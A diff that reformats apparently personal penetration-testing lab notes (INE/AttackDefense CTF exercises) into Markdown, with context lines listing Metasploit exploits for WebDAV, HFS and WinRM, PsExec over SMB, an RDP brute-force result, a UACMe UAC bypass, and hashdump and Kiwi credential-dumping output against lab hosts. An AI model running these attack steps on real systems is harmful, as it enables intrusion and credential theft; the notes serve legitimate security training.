@@ -1,6 +1,5 @@
-Exploiting Windows Vulnerabilities : 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows: IIS Server: WebDav Metasploit
+# Exploiting Windows Vulnerabilities : 
+## Windows: IIS Server: WebDav Metasploit
 	=> WebDAV (Web Distributed Authoring and Versioning)
 	=> 允許使用者協作編輯和管理遠端 Web 伺服器上的檔案
 	=> 提供了一個在伺服器（通常是 Web 伺服器或內容管理系統）上建立、變更和移動文件的框架
@@ -21,8 +20,7 @@ Windows: IIS Server: WebDav Metasploit
 	cmd :　dir /s /b C:\flag*
 	powershell : Get-ChildItem -Path C:\ -Filter "flag*" -Recurse
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows:SMB Server PSexec
+## Windows:SMB Server PSexec
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -p445 --script smb-protocols demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -47,9 +45,7 @@ Windows:SMB Server PSexec
 
 	meterpreter > shell> dir /s /b C:\flag* > type flag.txt
 
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows:Insecure RDP Service
+## Windows:Insecure RDP Service
 	=> RDP（遠端桌面協定）預設連接埠是3389。
 
 	nmap -sV -sC demo.ine.local --script vuln 
@@ -68,8 +64,7 @@ Windows:Insecure RDP Service
 	[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop
 
 	xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-WinRM: Exploitation with Metasploit
+## WinRM: Exploitation with Metasploit
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 	nmap --top-ports 7000 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
@@ -113,10 +108,9 @@ WinRM: Exploitation with Metasploit
 		set FORCE_VBS true
 		exploit
 	[+] Successfully migrated to svchost.exe (704) as: NT AUTHORITY\SYSTEM
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Privilege Escalation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-UAC Bypass: UACMe
+
+# Windows Privilege Escalation
+## UAC Bypass: UACMe
 	=> Bypassing UAC using the UACME tool
 	=> Windows User Account Control (UAC)
 	=> NTLM hash
@@ -187,8 +181,7 @@ UAC Bypass: UACMe
 	meterpreter > hashdump
 	admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
 	Admin NTLM Hash :4d6583ed4cef81c2f2ac3c88fc5f3da6
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Privilege Escalation: Impersonate(冒充)
+## Privilege Escalation: Impersonate(冒充)
 	nmap -sV -p 80 demo.ine.local
 	searchsploit hfs
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -212,10 +205,8 @@ Privilege Escalation: Impersonate(冒充)
 	getuid
 	=> Server username: ATTACKDEFENSE\Administrator
 	cat C:\\Users\\Administrator\\Desktop\\flag.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Credential Dumping
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Unattended Installation
+# Windows Credential Dumping
+## Unattended Installation
 	=> PowerUp.ps1
 	=> Source: https://github.com/PowerShellMafia/PowerSploit
 
@@ -262,8 +253,7 @@ Unattended Installation
 	C:\>dir /s /b C:\flag*
 	type
 	cat C:\\Users\\Administrator\\Desktop\\flag.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows: Meterpreter: Kiwi Extension
+## Windows: Meterpreter: Kiwi Extension
 	=> Meterpreter Kiwi 外掛程式是 Metasploit 框架中的一種高級後利用工具
 
 	nmap -sV -p 80 demo.ine.local
@@ -296,10 +286,9 @@ Windows: Meterpreter: Kiwi Extension
 	lsa_dump_secrets
 	SysKey : 377af0de68bdc918d22c57a263d38326
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: System-Host Based Attacks CTF 1
-=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染。
-=> 嘗試取得 root 或管理員權限來操縱或竊取敏感資料、安裝後門或導致系統崩潰
+## Host & Network Penetration Testing: System-Host Based Attacks CTF 1
+	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染。
+	=> 嘗試取得 root 或管理員權限來操縱或竊取敏感資料、安裝後門或導致系統崩潰
 	nmap -sC -sV target1.ine.local
 	80/tcp   open  http          Microsoft IIS httpd 10.0
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -364,8 +353,6 @@ Host & Network Penetration Testing: System-Host Based Attacks CTF 1
 	=> 只有兩個共享有讀寫權限：ADMIN$和C$
 	=> smbclient //target2.ine.local/C$ -U administrator
 		smb: \> dir
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 
 
 
